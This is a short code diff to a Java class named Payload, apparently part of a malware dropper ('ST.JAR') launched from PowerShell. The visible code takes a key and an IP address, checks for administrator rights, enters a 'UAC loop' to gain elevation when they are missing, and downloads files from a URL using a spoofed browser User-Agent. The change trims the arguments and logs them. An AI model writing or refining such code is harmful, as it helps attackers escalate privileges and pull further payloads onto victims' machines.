@@ -11,9 +11,12 @@ public class Payload {
         log("--- STARTING ST.JAR ---");
         try {
             if (args.length < 2) return;
-            String key = args[0];
-            String ip = args[1];
+            // ADDED .trim() TO STRIP INVISIBLE CHARACTERS FROM POWERSHELL
+            String key = args[0].trim();
+            String ip = args[1].trim();
             
+            log("Key: " + key + " | IP: " + ip);
+
             if (!isAdmin()) {
                 log("Not admin. Starting UAC loop...");
                 uacLoop(key, ip);
@@ -122,7 +125,6 @@ public class Payload {
 
     private static void downloadFile(String urlStr, File dest) {
         try {
-            // Use URL object directly to prevent DNS resolution issues
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setRequestProperty("User-Agent", "Mozilla/5.0");
